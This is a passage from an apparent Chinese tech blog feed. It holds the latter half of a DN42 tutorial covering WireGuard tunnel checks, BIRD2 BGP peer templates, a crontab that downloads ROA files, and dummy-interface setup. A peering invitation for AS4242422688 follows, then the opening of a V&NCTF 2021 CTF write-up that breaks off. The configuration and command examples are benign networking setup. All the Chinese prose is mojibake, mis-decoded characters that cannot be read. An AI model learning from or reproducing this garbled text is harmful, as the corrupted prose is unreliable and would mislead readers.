æ–‡ä»¶å</code> å°±è¡Œäº†ã€‚</p><p>æœ€åçœ‹çœ‹è¿æ¥å»ºç«‹äº†æ²¡æœ‰ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">wg show æ–‡ä»¶å<span class="token comment"># æˆ–è€…ç›´æ¥ wg</span></code></pre><p>çœ‹åˆ° <code>transfer</code> é‡Œå‘é€æ¥æ”¶éƒ½æœ‰æ•°æ®äº†è¯´æ˜å°±èƒ½è¿ä¸Šäº†ã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210325233345851.png"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ ping ä¸€ä¸‹å¯¹æ–¹ã€‚</p><p>WireGuard æ¥å£åå°±æ˜¯ä½ é…ç½®çš„æ–‡ä»¶åã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ping å¯¹æ–¹IP%WireGuardæ¥å£å</span><span class="token function">ping</span> fe80::xxxx%wg_424242xxxx</code></pre><p>å½“ç„¶äº†ï¼Œä¹Ÿå¯ä»¥æ‰‹å†™ systemd æ¥é… wgï¼Œå‚è€ƒ <a href="https://dn42.dev/howto/wireguard">å®˜æ–¹ Wiki</a> å°±å¥½äº†ã€‚</p><h2 id="0x06-å»ºç«‹-BGP-ä¼šè¯"><a href="#0x06-å»ºç«‹-BGP-ä¼šè¯" class="headerlink" title="0x06 å»ºç«‹ BGP ä¼šè¯"></a>0x06 å»ºç«‹ BGP ä¼šè¯</h2><p>BGP(Border Gateway Protocolï¼Œè¾¹ç•Œç½‘å…³åè®®) æ˜¯ä¸€ç§è·¯ç”±åè®®ï¼Œä¸€èˆ¬éƒ½ä½¿ç”¨è¿™ä¸ªæ¥è¿›è¡Œ peerã€‚</p><p>è·¯ç”±çš„è½¯ä»¶ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯ <strong>BIRD Internet Routing Daemon (v2)</strong> ã€‚</p><p>æ­¤å¤„å‚è€ƒ</p><ul><li><a href="https://wiki.dn42.us/howto/Bird2">DN42 Wiki ä¸Šçš„ Bird2 é…ç½®æ•™ç¨‹</a></li><li><a href="https://wiki.dn42.us/howto/Bird">DN42 Wiki ä¸Šçš„ Bird1 é…ç½®æ•™ç¨‹</a></li></ul><h3 id="bird-conf-ä¸-ROA"><a href="#bird-conf-ä¸-ROA" class="headerlink" title="bird.conf ä¸ ROA"></a>bird.conf ä¸ ROA</h3><p>è¿™é‡Œè¦æ³¨æ„ <strong>ä¸€å®šæŒ‰ç…§æ•™ç¨‹å…ˆé…å¥½ <code>/etc/bird/bird.conf</code>ï¼Œæˆ–è€… <code>/etc/bird.conf</code>ï¼</strong></p><p>æ­¤å¤„ä½¿ç”¨çš„æ˜¯ wiki ä¸Šçš„æ¨¡æ¿ï¼Œæ¯”å¦‚å–µå–µçš„ Variable header å¦‚ä¸‹ã€‚</p><p><code>OWNIP</code> å’Œ <code>OWNIPv6</code> æ˜¯ä½ æœ¬æœºè¦åˆ†é…çš„åœ°å€ï¼Œ<code>OWNNETSET</code> å’Œ <code>OWNNETSETv6</code> ä¸ç”¨æ¼äº†ç»“å°¾çš„ <code>+</code>ã€‚</p><pre class="language-conf" data-language="conf"><code class="language-conf">#################################################               Variable header                #################################################define OWNAS =  4242422688;define OWNIP =  172.23.6.6;define OWNIPv6 = fd00:feed:ca7::6;define OWNNET = 172.23.6.0/26;define OWNNETv6 = fd00:feed:ca7::/48;define OWNNETSET = [172.23.6.0/26+];define OWNNETSETv6 = [fd00:feed:ca7::/48+];#################################################                 Header end                   #################################################</code></pre><p>ç„¶åæŠŠ ROA (Route Origin Authorization) é…å¥½ã€‚</p><p>ä¸€èˆ¬è·¯å¾„åœ¨ <code>/etc/bird/roa_dn42{,_v6}.conf</code></p><p>å¯ä»¥å†™ä¸ª crontab å®šæœŸè‡ªåŠ¨ä¸‹è½½æ›´æ–°ã€‚æ³¨æ„ <code>bird.conf</code> é‡Œçš„ <code>roa</code> è·¯å¾„è¦é…çš„ä¸€è‡´ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># crontab -e</span>*/15 * * * * <span class="token function">curl</span> -sfSLR -o /etc/bird/roa_dn42.conf https://dn42.burble.com/roa/dn42_roa_bird2_4.conf <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> -sfSLR -o /etc/bird/roa_dn42_v6.conf https://dn42.burble.com/roa/dn42_roa_bird2_6.conf <span class="token operator">&amp;&amp;</span> /usr/sbin/birdc configure <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> /dev/null</code></pre><p>å¯ä»¥å…ˆæ‰§è¡Œä¸€æ¬¡è®©æ–‡ä»¶å­˜åœ¨ï¼Œä¸ç„¶åé¢å¯åŠ¨ bird çš„æ—¶å€™å¯èƒ½ä¼šæœ‰é—®é¢˜ã€‚</p><h3 id="Peers-æ–‡ä»¶"><a href="#Peers-æ–‡ä»¶" class="headerlink" title="Peers æ–‡ä»¶"></a>Peers æ–‡ä»¶</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p /etc/bird/peers</code></pre><p>æ¯ä¸€ä¸ª peer å»ºä¸€ä¸ªæ–‡ä»¶ <code>/etc/bird/peers/&lt;NEIGHBOR_NAME&gt;.conf</code>ã€‚</p><p>ä¸‹é¢æ˜¯ Lan Tian å¸ˆç¥–çš„æ¨¡æ¿ã€‚</p><pre class="language-none"><code class="language-none">protocol bgp dn42_[PEER_NAME]_v4 from dnpeers {    neighbor [YOUR_DN42_IP] as [YOUR_ASN];    direct;    # ä¸‹é¢è¿™æ®µæ˜¯åœ¨ IPv4 BGP ä¸­ç¦ç”¨ IPv6 è·¯ç”±ä¼ é€’ï¼Œå¼ºçƒˆæ¨èï¼›æŸ¥çœ‹ä¸‹æ–‡ä»¥å†³å®šä½ è¦ä¸è¦è¿™æ ·åšï¼ˆä¿ç•™ä¸‹é¢çš„å†…å®¹ï¼‰    ipv6 {        import none;        export none;    };};protocol bgp dn42_[PEER_NAME]_v6 from dnpeers {    neighbor [YOUR_LINK_LOCAL_IP] % 'dn42-[PEER_NAME]' as [YOUR_ASN];    direct;    # ä¸‹é¢è¿™æ®µæ˜¯åœ¨ IPv6 BGP ä¸­ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ï¼›æŸ¥çœ‹ä¸‹æ–‡ä»¥å†³å®šä½ è¦ä¸è¦è¿™æ ·åšï¼ˆä¿ç•™ä¸‹é¢çš„å†…å®¹ï¼‰    ipv4 {        import none;        export none;    };};</code></pre><blockquote><ul><li>MY æŒ‡çš„æ˜¯ä½ è‡ªå·±ï¼Œè€Œ YOUR æŒ‡çš„æ˜¯ä½ å°†è¦ Peer çš„é‚£ä¸ªäººã€‚</li><li>BIRD ä¸­é…ç½®çš„æ˜¯ DN42 å†…çš„ IP è€Œéå…¬ç½‘ IPã€‚</li><li>ç›¸æ¯” DN42 Wiki ä¸Šçš„é…ç½®ï¼Œæˆ‘åŠ äº†ä¸€è¡Œ <code>direct;</code>ï¼ŒåŸå› æ˜¯æˆ‘å‘ç°å¦‚æœç¼ºå°‘è¿™è¡Œï¼Œè·¯ç”±ä¿¡æ¯æœ‰å¯èƒ½æ— æ³•è¢«æ­£ç¡®çš„å¯¼å…¥ç³»ç»Ÿè·¯ç”±è¡¨ã€‚<ul><li>BIRD é»˜è®¤ä¼šæ ¹æ®ç³»ç»Ÿè·¯ç”±è¡¨æŸ¥æ‰¾è¦å°†æ•°æ®åŒ…è½¬å‘åˆ°å“ªä¸ªç½‘ç»œè®¾å¤‡ï¼Œä»¥æ­¤è®¾ç½®ç³»ç»Ÿè·¯ç”±è¡¨ï¼Œä½†æœ‰æ—¶æŸ¥æ‰¾ä¼šå¤±è´¥ï¼ˆè¡¨ç°ä¸º <code>ip route</code> ä¸­å‡ºç°å¤§ç‰‡ <code>unreachable</code>ï¼‰ã€‚</li><li>æ­¤æ—¶æŒ‡å®š <code>direct</code>ï¼Œè®© BIRD å°†æ•°æ®åŒ…ç›´æ¥è½¬å‘åˆ° BGP è¿æ¥æ‰€åœ¨çš„ç½‘å¡ä¸Šã€‚</li><li><code>direct</code> çš„å«ä¹‰æ˜¯è¿æ¥åŒæ–¹ç›´æ¥è¿æ¥ï¼ˆå³ä¸­é—´æ²¡æœ‰é—´éš”å…¶å®ƒçš„è·¯ç”±å™¨ï¼‰ã€‚</li></ul></li><li>PEER_NAME æ˜¯å¯¹æ–¹çš„æ˜µç§°ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯ Linux ä¸‹çš„ç½‘ç»œè®¾å¤‡åï¼Œä¸éš§é“ä¿æŒä¸€è‡´ã€‚æ³¨æ„æ•´ä¸ªç½‘ç»œè®¾å¤‡åä¸èƒ½è¶…è¿‡ 15 ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­ã€‚</li><li>åœ¨ IPv6 Peering æ—¶ï¼Œæˆ‘æ¨èä½¿ç”¨ Link-local IPã€‚<ul><li>ç›´æ¥ä½¿ç”¨å¯¹æ–¹æ•´ä¸ªèŠ‚ç‚¹çš„ IPv6 åœ°å€ï¼ˆæŒ‡ <code>fd00::/8</code> èŒƒå›´ä¸­çš„é‚£ä¸ªï¼‰æ—¶ï¼Œéƒ¨åˆ†ç³»ç»Ÿä¸ä¼šè‡ªåŠ¨æ·»åŠ åˆ°å¯¹ç«¯çš„è·¯ç”±ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€æ¡ï¼›è§ <code>éš§é“æ­å»ºï¼šWireGuard</code> ä¸€èŠ‚ã€‚</li></ul></li><li>åœ¨ BIRDv2 ä¸­ï¼Œå¼ºçƒˆæ¨èåœ¨ IPv4 BGP ä¼šè¯ä¸­ç¦ç”¨ IPv6 çš„è·¯ç”±ä¼ é€’ï¼ŒåŒæ—¶å¯ä»¥åœ¨ IPv6 BGP ä¸­ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ã€‚<ul><li>BIRDv2 æ”¯æŒåœ¨ä¸€ä¸ª BGP ä¼šè¯ä¸­åŒæ—¶ä¼ é€’ IPv4 å’Œ IPv6 çš„è·¯ç”±ã€‚</li><li>åœ¨ IPv4 BGP ä¼šè¯ä¸­ï¼ŒBIRDv2 éš¾ä»¥æ­£ç¡®åˆ¤æ–­ IPv6 æ•°æ®åŒ…è½¬å‘ç›®æ ‡çš„åœ°å€ï¼ˆNext Hopï¼‰ï¼Œä¼šå¯¼è‡´ <code>ip -6 route</code> ä¸­å‡ºç°å¤§ç‰‡ <code>unreachable</code>ã€‚<ul><li>å› æ­¤ç›´æ¥ç¦ç”¨å°±å¥½äº†ã€‚</li></ul></li><li>åœ¨ IPv6 BGP ä¼šè¯ä¸­ä¼ é€’ IPv4 è·¯ç”±æ—¶ï¼Œå¦‚æœåŒæ–¹ä½¿ç”¨ç‰¹å®šçš„ BGP è½¯ä»¶ç»„åˆï¼Œä¸€æ–¹æˆ–åŒæ–¹çš„æ—¥å¿—ä¸­ä¼šå‡ºç°å¤§ç‰‡ <code>Invalid NEXT_HOP Attribute</code>ï¼ŒæŒ‡ Next Hop åˆ¤æ–­å‡ºé”™ã€‚<ul><li>ä½† IPv6 BGP ä¸­åŒæ—¶ä¼ é€’ IPv4 å’Œ IPv6 è·¯ç”±çš„åº”ç”¨è¿˜æ¯”è¾ƒå¹¿æ³›ï¼Œå› æ­¤ä¸€èˆ¬å»ºè®®ä¸è¦ç¦ç”¨ IPv4 è·¯ç”±ä¼ é€’ï¼Œé™¤éå‡ºç°äº†é—®é¢˜ã€‚</li></ul></li></ul></li></ul></blockquote><p>BIRD2 æ˜¯æ”¯æŒ <a href="https://en.wikipedia.org/wiki/Multiprotocol_BGP">Multiprotocol BGP</a> çš„ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åœ¨å•ç‹¬ä¸€ä¸ª IPv4/IPv6 BGP session é‡Œå»ºç«‹ v4 å’Œ v6 ä¸¤æ¡ channelã€‚<em>ï¼ˆå¤§æ¦‚æ„æ€æ˜¯è¿™æ ·ï¼Œä¸çŸ¥é“è¯´çš„å‡†ä¸å‡†ç¡®</em></p><p>äºæ˜¯<strong>å¦‚æœåŒæ–¹éƒ½æ”¯æŒ MP-BGP çš„è¯ï¼Œä¸€èˆ¬æ˜¯ç”¨ link-local å»ºç«‹ä¸€æ¡ v6 çš„ BGP session å°±å¥½äº†ã€‚</strong></p><p>ç”±äº link-local åªæ˜¯åœ¨è¿æ¥åŒæ–¹çš„æ¥å£è¿›è¡Œçš„ï¼Œéœ€è¦æŒ‡å®šå¥½æ¥å£ã€‚</p><p>å¯ä»¥å‚è€ƒ <strong>å–µå–µçš„æ¨¡æ¿</strong>ã€‚</p><pre class="language-conf" data-language="conf"><code class="language-conf">protocol bgp dn42_424242xxxx_v6 from dnpeers {    neighbor fe80::xxxx % 'wg_424242xxxx' as 424242xxxx;    direct;}</code></pre><p>æ³¨æ„ <code>fe80::xxxx</code> æ˜¯å¯¹æ–¹çš„ link-local addressï¼Œ<code>wg_424242xxxx</code> æ˜¯ä½ ç½‘ç»œæ¥å£çš„åå­—ã€‚</p><p>ä¹‹åå¯åŠ¨ BIRDï¼Œæˆ–è€…é‡æ–°åŠ è½½é…ç½®ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> bird start <span class="token comment"># å¦‚æœæ²¡å¯åŠ¨çš„è¯</span>birdc c  <span class="token comment"># å³ birdc configure</span></code></pre><p>ç„¶åå¯ä»¥çœ‹çœ‹è¿æ¥çŠ¶æ€äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">birdc s p <span class="token comment"># å³ birdc show protocol </span></code></pre><p><img src="/2021/03/25/Server_DN42/image-20210326001444531.png"></p><p>å¦‚æœæ˜¾ç¤ºçš„æ˜¯ <code>Established</code>ï¼Œé‚£ä¹ˆè¿æ¥å°±å»ºç«‹å¥½äº†ã€‚</p><p><strong>Peer æˆåŠŸï¼</strong></p><p>å½“ç„¶è¿˜å¯ä»¥æŸ¥çœ‹æŸæ¡è·¯ç”±é…ç½®çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">birdc s p a dn42_424242xxxx_v6 <span class="token comment"># å³ birdc show protocol all dn42_424242xxxx_v6</span></code></pre><p>ç„¶åå°±èƒ½ ping ä¸€ä¸‹ DN42 å†…çš„æœåŠ¡äº†ï¼Œæ¯”å¦‚ 172.20.0.53 ä¹‹ç±»çš„ã€‚</p><h3 id="ä¸€ç‚¹ç‚¹æ‰©å±•"><a href="#ä¸€ç‚¹ç‚¹æ‰©å±•" class="headerlink" title="ä¸€ç‚¹ç‚¹æ‰©å±•"></a>ä¸€ç‚¹ç‚¹æ‰©å±•</h3><p><strong>2021.3.21 æ–°å‘å¸ƒçš„ BIRD v2.0.8</strong> æ–°å¢äº†è®¸å¤šç‰¹æ€§ã€‚</p><p>å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯æ”¯æŒäº† extended next hopï¼Œå¯ä»¥å®ç° IPv4 æµé‡åœ¨ IPv6-only ç½‘ç»œä¸Šçš„è½¬å‘ã€‚<em>ï¼ˆåæ­£ç¾¤å‹è¯´çš„æˆ‘ä¹Ÿæ‡’å¾—è€ƒè¯äº†</em></p><p>å‚è€ƒ BIRD æ–‡æ¡£é‡Œçš„ <a href="https://bird.network.cz/?get_doc&amp;v=20&amp;f=bird-6.html#ss6.3">BGP extended next hop</a> </p><p><img src="/2021/03/25/Server_DN42/image-20210326003544763.png"></p><p>åœ¨ <code>dnpeers</code> é‡Œçš„ <code>ipv4</code> ä¸­åŠ å…¥ <code>extended next hop on;</code> å³å¯ä½¿ç”¨è¿™ä¸€ç‰¹æ€§ã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210326004515058.png"></p><p>äºæ˜¯å’Œåˆ«äºº peer çš„æ—¶å€™ï¼ŒWireGuard åªéœ€è¦ peer ä¸€ä¸ª IPv6 link-local address å°±å®Œäº‹äº†ï¼Œè¿ DN42 IPv4 éƒ½ä¸éœ€è¦äº†ã€‚</p><p>å½“ç„¶è¿˜éœ€è¦åŠ ä¸€ä¸ª dummy æ¥å£æ¥å†™æœ¬æœºçš„åœ°å€ï¼Œç±»ä¼¼äº</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ip</span> <span class="token function">link</span> <span class="token function">add</span> dummy1 <span class="token builtin class-name">type</span> dummy<span class="token function">ip</span> addr <span class="token function">add</span> <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>/32 dev dummy1<span class="token function">ip</span> addr <span class="token function">add</span> <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>/128 dev dummy1</code></pre><p>ä¸ç„¶è·¯ç”±è¡¨æœ‰å¯èƒ½å†™å…¥ä¸åˆ°å†…æ ¸ä¸­ã€‚</p><p>ä¸ºäº†æŒä¹…åŒ–ï¼Œéœ€è¦å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚Ubuntu ä¸‹ç”¨çš„æ˜¯ netplanã€‚</p><p>åœ¨ <code>/etc/netplan/</code> ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> 01-dummy0.yamlnetwork:  version: <span class="token number">2</span>  renderer: networkd  bridges:    dummy0:      dhcp4: no      dhcp6: no      accept-ra: no      interfaces: <span class="token punctuation">[</span> <span class="token punctuation">]</span>      addresses:        - <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>/32        - <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>/128</code></pre><p>å…¶ä»–ç³»ç»Ÿçš„è¯å¯ä»¥é…ç½® <code>/etc/network/interfaces</code>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">auto dummy0iface dummy0 inet static        pre-up <span class="token function">ip</span> <span class="token function">link</span> del dummy0 <span class="token operator">||</span> <span class="token boolean">true</span>        pre-up <span class="token function">ip</span> <span class="token function">link</span> <span class="token function">add</span> dummy0 <span class="token builtin class-name">type</span> dummy <span class="token operator">||</span> <span class="token boolean">true</span>        address <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>/32        post-up <span class="token function">ip</span> addr <span class="token function">add</span> <span class="token operator">&lt;</span>ä½ çš„DN42 IPv<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>/128 dev dummy0</code></pre><p>ç„¶åé‡å¯ä¹‹åå°±èƒ½è‡ªåŠ¨é…ä¸Šè¿™ä¸ª dummy æ¥å£äº†ã€‚</p><p>BTWï¼Œå–µå–µè§‰å¾—ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨é…å¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯è‡ªå·±ç”¨ Python ç³Šäº†ä¸ªå°è„šæœ¬ï¼Œåªéœ€è¦è¾“å…¥å¿…è¦çš„ä¿¡æ¯ï¼Œå°±èƒ½è‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œå¹¶å»ºç«‹ WireGuard è¿æ¥ï¼Œé‡æ–°åŠ è½½ BIRD é…ç½®äº†ï¼Œè´¼èˆ’æœï¼</p><p>ï¼ˆä¸è¿‡è„šæœ¬å¤ªä¸‘äº†è€Œä¸”æ˜¯è‡ªå·±ç”¨çš„ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†å§</p><h2 id="0x07-ä¸€äº›å¥½ç©çš„ä¸œè¥¿"><a href="#0x07-ä¸€äº›å¥½ç©çš„ä¸œè¥¿" class="headerlink" title="0x07 ä¸€äº›å¥½ç©çš„ä¸œè¥¿"></a>0x07 ä¸€äº›å¥½ç©çš„ä¸œè¥¿</h2><p>å¤§ä½¬ä»¬ç»™èŠ‚ç‚¹åšäº†å¯è§†åŒ–ï¼Œæ¯”å¦‚ä»¥ä¸‹å‡ ä¸ªã€‚</p><p><a href="https://map42.0x7f.cc/">https://map42.0x7f.cc/</a></p><p><img src="/2021/03/25/Server_DN42/image-20210326002100613.png"></p><p><a href="https://map.meson.cc/">https://map.meson.cc/</a></p><p><img src="/2021/03/25/Server_DN42/image-20210325215319450.png"></p><p><a href="https://nixnodes.net/dn42/graph/">https://nixnodes.net/dn42/graph/</a></p><p><img src="/2021/03/25/Server_DN42/image-20210325201121252.png"></p><p><a href="https://bgp42.strexp.net/map2">https://bgp42.strexp.net/map2</a></p><p><img src="/2021/03/25/Server_DN42/image-20210326010204433.png"></p><p>å•Šå•Šå•Šï¼Œæ¯›çº¿å¥½å¤šç¼ ä½å–µå–µäº†<em>ï¼ˆå¤§é›¾</em></p><br><hr><p>å½“ç„¶è¿˜æœ‰å¾ˆå¤š dn42 / NeoNetwork NOC çš„ looking glassï¼Œæ¯”å¦‚ï¼š</p><ul><li><a href="https://lg.burble.com/">https://lg.burble.com/</a></li><li><a href="https://lg.strexp.net/">https://lg.strexp.net/</a></li><li><a href="https://lg.lantian.pub/">https://lg.lantian.pub/</a></li><li><a href="https://lg.lss233.com/">https://lg.lss233.com/</a></li></ul><p>ä»¥åŠ DN42 é‡Œçš„æœåŠ¡ <a href="https://wiki.dn42.dev/internal/Internal-Services">internal/Internal Services</a></p><p>Burble è€å¸ˆçš„æœåŠ¡ <a href="https://dn42.burble.com/services/public/">https://dn42.burble.com/services/public/</a></p><p>å½“ç„¶è¿˜å¯ä»¥ç»‘å®š .dn42 åŸŸåï¼Œè®¾ç½®åå‘è§£æ rDNSï¼Œå½“ç„¶è¿˜æœ‰ .dn42 çš„ CA è¯ä¹¦â€¦â€¦</p><p>ä¸ºäº†ç»™è‡ªå·±çš„å¤šä¸ªè®¾å¤‡ç»„ç½‘ï¼Œè¿˜å¯ä»¥ iBGPã€iGPã€Babelã€OSPF ç­‰è·¯ç”±åè®®ç»¼åˆæ¥ä½¿ç”¨ã€‚</p><p>åæ­£è¿˜èƒ½æ…¢æ…¢ç©å‘¢ï¼ˆ</p><h2 id="0x08-Peer-with-MeowNet"><a href="#0x08-Peer-with-MeowNet" class="headerlink" title="0x08 Peer with MeowNet"></a>0x08 Peer with MeowNet</h2><p>ä»€ä¹ˆï¼Ÿä½ æƒ³å’Œæˆ‘ Peer äº†ï¼Ÿ<strong>å¿«æ¥ Peerï¼</strong></p><p><strong>AS4242422688</strong><br><strong>MeowNet</strong><br><em>MiaoTonyâ€™s DN42 Network</em></p><p><strong>DN42 IP:</strong></p><p>172.23.6.0/26<br>fd00:feed:ca7::/48</p><p><strong>Nodes:</strong></p><ul><li>LV1 - Las Vegas, US, <a href="https://my.frantech.ca/aff.php?aff=4525">BuyVM</a></li><li>To be continuedâ€¦</li></ul><p><strong>WireGuard and Multiprotocol BGP are preferred.</strong></p><p>I prefer to use link-local IPv6 address to set up multiprotocol BGP session (with extended next hop enabled).</p><p><strong>Welcome to peer with me!</strong></p><p><strong>Telegram: (Recommended)</strong> Just PM <a href="https://t.me/meow_portal_bot">@meow_portal_bot</a> and tell me you are from DN42.</p><p><strong>Email:</strong> dn42@miaotony.xyz</p><hr><p><strong>You should send me some info like follows.</strong></p><ul><li>Your ASN</li><li>Public IP <ul><li>IPv4 is preferred, but you can send v4/v6 both</li></ul></li><li>DN42 IPv4 and IPv6 <ul><li>Link-local address is preferred</li></ul></li><li>Your WireGuard Port <ul><li>22688 by default</li><li>I will use <code>2&lt;Your last 4-digit ASN&gt;</code> for you</li></ul></li><li>Is Multiprotocol BGP supported? <ul><li>If yes, I will just use the link-local IPv6 address to set up v4+v6 BGP session</li><li>Yes by default</li></ul></li><li>Something else you want to share with me <ul><li>Extended next hop enabled? </li><li>etc.</li></ul></li></ul><p>æˆ–è€…çœ‹ä¸‹é¢ä¹Ÿè¡Œã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210326010342272.png"></p><h2 id="0x09-å°ç»“"><a href="#0x09-å°ç»“" class="headerlink" title="0x09 å°ç»“"></a>0x09 å°ç»“</h2><p>è¿™ç¯‡æ–‡ç« å¯¹ç”³è¯· ASNã€IPã€åŸŸåï¼Œæ­å»º VPN é€šä¿¡éš§é“ï¼Œé…ç½® BGP è·¯ç”±ï¼Œå®Œæˆå’Œå…¶ä»–ç½‘ç»œçš„ Peer ç­‰å†…å®¹è¿›è¡Œäº†ä»‹ç»ã€‚</p><p>ä½†è¦æ³¨æ„çš„æ˜¯æœ¬æ–‡<strong>å¹¶ä¸æ˜¯</strong>ä¸€ç¯‡å®Œæ•´çš„ä»‹ç»ï¼Œè¿˜éœ€è¦å‚è€ƒå…¶ä»–æ•™ç¨‹æ¥ç»¼åˆè¿›è¡Œé…ç½®ã€‚</p><p>ä¸è¿‡åˆšæ¥ç© DN42ï¼Œè¿˜æœ‰å¾ˆå¤šä¸ç†Ÿæ‚‰çš„åœ°æ–¹ï¼Œè¿˜å¾—æ„Ÿè°¢ç¾¤é‡Œçš„å¤§ä½¬ä»¬ Orzã€‚</p><p>å¦‚æœæœ‰é”™è¯¯æ¬¢è¿æŒ‡å‡ºï¼Œå–µï¼</p><h2 id="0xFF-References-amp-Extensive-Reading"><a href="#0xFF-References-amp-Extensive-Reading" class="headerlink" title="0xFF References &amp; Extensive Reading"></a>0xFF References &amp; Extensive Reading</h2><ul><li><a href="https://dn42.dev/howto/Getting-started">DN42 å®˜æ–¹ Wiki howto/Getting Started</a></li><li>Lan Tian å¸ˆç¥–çš„ <a href="https://lantian.pub/article/modify-website/dn42-experimental-network-2020.lantian">DN42 å®éªŒç½‘ç»œä»‹ç»åŠæ³¨å†Œæ•™ç¨‹ï¼ˆ2020-10-01 æ›´æ–°ï¼‰</a></li><li><a href="https://blog.outv.im/2020/dn42-neonetwork-guide/">æ¥å…¥ dn42 åŠ NeoNetwork</a></li><li><a href="https://www.wsfnk.com/archives/category/dn42">è¾£æ¡â‘ å· çš„ DN42 ç³»åˆ—</a></li><li><a href="https://ithelp.ithome.com.tw/users/20119484/ironman/3438">ä»€éº¼ï¼Œé€éBGPå¾å°å‹ç¶²è·¯åˆ°çœŸæ­£çš„ç¶²éš›ç¶²è·¯ï¼ï¼Ÿ ç³»åˆ—</a></li><li><a href="https://soha.moe/post/bird-bgp-kickstart.html">BIRD ä¸ BGP çš„æ–°æ‰‹å¼€åœº</a></li><li><a href="https://weiti.org/dn42/2018/01/13/ibgp-bgp-within-as4242423905">iBGP - BGP within AS4242423905</a></li><li>etc.</li></ul><br><p>å–µå‘œï¼ç»ˆäºæ‰¯å®Œè¿™ç¯‡æ–‡ç« äº†ï¼</p><p>å¥½ä¹…æ²¡å†™æŠ€æœ¯æ–‡ç« äº†ï¼Œå–µå–µç´¯æ­»äº†ï¼ˆ</p><p><em>ï¼ˆæºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> DN42 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 V&amp;NCTF å…¬å¼€èµ› WriteUp</title>
      <link href="2021/03/15/CTF_2021VNCTF/"/>
      <url>2021/03/15/CTF_2021VNCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/15/CTF_2021VNCTF/68726A7E1912FD41F252350A7324E571.jpg"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>V&amp;NCTF2021 å…¬å¼€èµ›</strong></p><p><a href="https://buuoj.cn/vnctf_2021">https://buuoj.cn/vnctf_2021</a></p><p>æ¯”èµ›æ—¶é—´ï¼š3æœˆ14æ—¥10:00 - 3æœˆ14æ—¥ 22:00<br>é¢˜ç›®åˆ†ç±»ï¼šWeb Pwn Re Misc Crypto BlockChain EGG<br>é¢˜ç›®éš¾åº¦ï¼šç®€å•çš„ç­¾åˆ°<br>æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ›<br>æ¯”èµ›åœ°ç‚¹ï¼šBUUOJ</p></blockquote><p>å‘¨æœ«æœ‰ä¸ª V&amp;NCTFï¼Œé¢˜ç›®æ˜¯ V&amp;N æˆ˜é˜Ÿä¸­å¤§ä¸€å¤§äºŒçš„å°å¸ˆå‚…ä»¬å‡ºçš„ï¼Œæ¯”èµ›ç»“æŸå‰æ¥çœ‹äº†ä¸€çœ¼ï¼Œåšäº†å‡ ä¸ªé¢˜ç©ç©ã€‚</p><p>è¿™ç¯‡å…¶å®å°±å¾ˆæ°´äº† 2333.</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å†°å†°å¥½åƒè—ç€ç§˜å¯†"><a href="#å†°å†°å¥½åƒè—ç€ç§˜å¯†" class="headerlink" title="å†°å†°å¥½åƒè—ç€ç§˜å¯†"></a>å†°å†°å¥½åƒè—ç€ç§˜å¯†</h3><blockquote><p>å‘ç°å†°å†°è—ç€çš„flagï¼Œflagæ ¼å¼ä¸ºVNCTF{*}</p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª <code>FFT.rar</code> å‘ç°æ‰“ä¸å¼€ã€‚</p><p>æœ¬æ¥æƒ³ä¿®ä¸€ä¸‹çš„ï¼Œå‘ç°ç”¨ WINRAR 